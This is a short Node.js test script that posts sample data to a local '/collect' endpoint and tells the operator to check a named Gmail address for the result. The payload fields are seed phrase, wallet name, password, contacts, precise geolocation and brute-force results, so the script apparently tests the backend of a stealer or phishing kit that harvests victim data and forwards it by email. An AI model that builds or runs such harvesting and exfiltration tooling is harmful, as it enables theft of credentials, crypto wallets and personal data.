const axios = require("axios");

// Test data
const testData = {
  timestamp: new Date().toISOString(),
  ip: "192.168.1.100",
  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  platform: "Windows",
  device: "16GB RAM",
  language: "en-US",
  screen: "1920x1080",
  cookies: "enabled",
  latitude: "40.7128",
  longitude: "-74.0060",
  accuracy: "10m",
  geoError: "None",
  localStorage: "enabled",
  contacts: ["contact1@test.com", "contact2@test.com"],
  walletName: "Test Crypto Wallet",
  seedPhrase: "test seed phrase for testing purposes",
  password: "testPassword123",
  bruteForceResults: {
    attempts: 5,
    success: false,
    timeSpent: "2.5 seconds",
  },
};

async function testServer() {
  try {
    console.log("🚀 Testing server...");
    console.log("📤 Sending test data...");

    const response = await axios.post(
      "http://localhost:3000/collect",
      testData,
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    );

    console.log("✅ Server response:", response.data);
    console.log(
      "📧 Check your email at 411plus411@gmail.com for the test data!"
    );
  } catch (error) {
    console.error("❌ Error testing server:", error.message);
    if (error.response) {
      console.error("Server response:", error.response.data);
    }
  }
}

// Run the test
testServer();
